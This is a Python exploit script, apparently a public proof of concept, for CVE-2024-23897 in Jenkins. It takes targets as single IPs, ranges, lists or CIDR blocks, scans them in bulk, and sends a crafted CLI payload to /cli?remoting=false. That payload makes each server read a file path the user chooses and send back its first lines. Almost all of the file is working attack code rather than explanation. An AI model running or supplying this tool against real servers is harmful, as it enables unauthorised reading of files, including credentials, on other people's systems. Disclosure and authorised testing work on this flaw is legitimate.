#!/usr/bin/env python3

import threading
import http.client
import time
import uuid
import sys
import urllib.parse
import argparse
import ipaddress

BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
ENDC = "\033[0m"
CONTENT_TYPE_OCTET_STREAM = 'application/octet-stream'

def display_help_message():
    parser.print_help()

def display_banner():
    banner = """
CVE-2024-23897 | Jenkins <= 2.441 & <= LTS 2.426.2 PoC and scanner.
Alexander Hagenah / @xaitax / ah@primepage.de"
"""
    print(BLUE + banner + ENDC)



def expand_cidr(cidr):
    try:
        ip_network = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in ip_network.hosts()]
    except ValueError:
        return []

def expand_range(ip_range):
    start_ip, end_ip = ip_range.split('-')
    start_ip = ipaddress.ip_address(start_ip)
    end_ip = ipaddress.ip_address(end_ip)
    return [str(ipaddress.ip_address(start_ip) + i) for i in range(int(end_ip) - int(start_ip) + 1)]

def expand_list(ip_list):
    return ip_list.split(',')

def generate_ip_list(target):
    if '-' in target:
        return expand_range(target)
    elif ',' in target:
        return expand_list(target)
    elif '/' in target:
        return expand_cidr(target)
    else:
        return [target]

def handle_target(target_url, session_id, data_bytes):
    print(BLUE + f"🔍 Scanning {target_url}" + ENDC)
    if args.output_file:
        write_to_output_file(args.output_file, f"🔍 Scanning {target_url}")

    download_thread = threading.Thread(target=send_download_request, args=(target_url, session_id))
    upload_thread = threading.Thread(target=send_upload_request, args=(target_url, session_id, data_bytes))

    download_thread.start()
    time.sleep(0.1)
    upload_thread.start()

    download_thread.join()
    upload_thread.join()

def send_download_request(target_url, session_id):
    try:
        parsed_url = urllib.parse.urlparse(target_url)
        connection = http.client.HTTPConnection(parsed_url.netloc, timeout=10)
        connection.request("POST", "/cli?remoting=false", headers={
            "Session": session_id,
            "Side": "download"
        })
        response = connection.getresponse().read()
        result = f"💣 Exploit Response from {target_url}: \n{response.decode()}"
        print(GREEN + result + ENDC)
        if args.output_file:
            write_to_output_file(args.output_file, result)
    except Exception as e:
        error_message = f"❌ {target_url} not reachable: {e}\n"
        print(RED + error_message + ENDC)
        if args.output_file:
            write_to_output_file(args.output_file, error_message)

def send_upload_request(target_url, session_id, data_bytes):
    try:
        parsed_url = urllib.parse.urlparse(target_url)
        connection = http.client.HTTPConnection(parsed_url.netloc, timeout=10)
        connection.request("POST", "/cli?remoting=false", headers={
            "Session": session_id,
            "Side": "upload",
            "Content-type": CONTENT_TYPE_OCTET_STREAM
        }, body=data_bytes)
        response = connection.getresponse().read()
    except Exception as e:
        pass

def read_hosts_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file if line.strip()]

def write_to_output_file(file_path, data):
    with open(file_path, 'a', encoding='utf-8') as file:
        file.write(data + '\n')

parser = argparse.ArgumentParser(description='CVE-2024-23897 | Jenkins <= 2.441 & <= LTS 2.426.2 exploitation and scanner.')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-t', '--target', help='Target specification. Can be a single IP (e.g., 192.168.1.1), a range of IPs (e.g., 192.168.1.1-192.168.1.255), a list of IPs separated by commas (e.g., 192.168.1.1,192.168.1.2), or a CIDR block (e.g., 192.168.1.0/24).')
group.add_argument('-i', '--input-file', help='Path to input file containing hosts.')
parser.add_argument('-p', '--port', type=int, default=8080, help='Port number. Default is 8080.')
parser.add_argument('-f', '--file', required=True, help='File to read on the target system. Only maximum of 3 lines can be extracted.')
parser.add_argument('-o', '--output-file', help='Path to output file for saving the results.')


display_banner()

if len(sys.argv) == 1:
    display_help_message()
    sys.exit(1)

args = parser.parse_args()

data_bytes = (
    b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' +
    args.file.encode() +
    b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'
)

if args.input_file:
    target_urls = read_hosts_from_file(args.input_file)
else:
    target_ips = generate_ip_list(args.target)
    target_urls = [f'http://{target_ip}:{args.port}' for target_ip in target_ips]

for target_url in target_urls:
    session_id = str(uuid.uuid4())
    handle_target(target_url, session_id, data_bytes)
